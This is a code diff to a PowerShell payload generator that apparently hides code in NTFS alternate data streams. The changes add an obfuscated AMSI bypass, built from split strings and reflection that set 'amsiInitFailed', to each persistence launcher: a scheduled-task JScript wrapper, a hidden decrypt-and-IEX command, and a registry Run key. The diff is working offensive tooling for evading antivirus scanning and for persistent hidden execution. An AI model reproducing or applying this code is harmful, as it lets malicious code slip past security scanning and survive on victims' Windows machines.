@@ -85,7 +85,10 @@ param(
     [int]$InstanceCount = 1,
     
     [string]$OutputFile = "ads-payload.txt",
-    [string]$ManifestDir = "./manifests"
+    [string]$ManifestDir = "./manifests",
+
+    # Opt out of Amsi bypass
+    [switch]$NoAmsi
 )
 
 Write-Host "`n╔═══════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
@@ -353,6 +356,7 @@ var cmd = "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -Execut
     "};" +
     "`$k=Get-HostKey;" +
     "`$e=Get-Content '__ADSPATH__' -Raw;" +
+    "try{`$x=[Ref].Assembly.GetType('System.Management.Automation.'+`$('Am'+'si'+'Utils'));`$y=`$x.GetField(`$('am'+'si'+'Init'+'Failed'),'NonPublic,Static');`$y.SetValue(`$null,`$true)}catch{};" +
     "`$p=Dec `$e `$k;" +
     "IEX `$p" +
     "\"";
@@ -380,6 +384,7 @@ Register-ScheduledTask -TaskName `$tn -Action `$a -Trigger `$t -Settings `$s -Pr
 `$_jsBody=@'
 var shell = new ActiveXObject("WScript.Shell");
 var cmd = "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"" +
+    "try{`$x=[Ref].Assembly.GetType('System.Management.Automation.'+`$('Am'+'si'+'Utils'));`$y=`$x.GetField(`$('am'+'si'+'Init'+'Failed'),'NonPublic,Static');`$y.SetValue(`$null,`$true)}catch{};" +
     "IEX(Get-Content '__ADSPATH__' -Raw)" +
     "\"";
 shell.Run(cmd, 0, false);
@@ -401,7 +406,7 @@ Register-ScheduledTask -TaskName `$tn -Action `$a -Trigger `$t -Settings `$s -Pr
     } elseif ($Persist -eq 'registry') {
         # Registry persistence: unchanged (no window-flash issue here)
         $block += @"
-Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name `$tn -Value "powershell.exe -NoP -W Hidden -C `"IEX(gc '`$hp``:`$sn' -Raw)`""
+Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name `$tn -Value "powershell.exe -NoP -W Hidden -C `"try{`$x=[Ref].Assembly.GetType('System.Management.Automation.'+`$('Am'+'si'+'Utils'));`$y=`$x.GetField(`$('am'+'si'+'Init'+'Failed'),'NonPublic,Static');`$y.SetValue(`$null,`$true)}catch{};IEX(gc '`$hp``:`$sn' -Raw)`""
 
 "@
     }
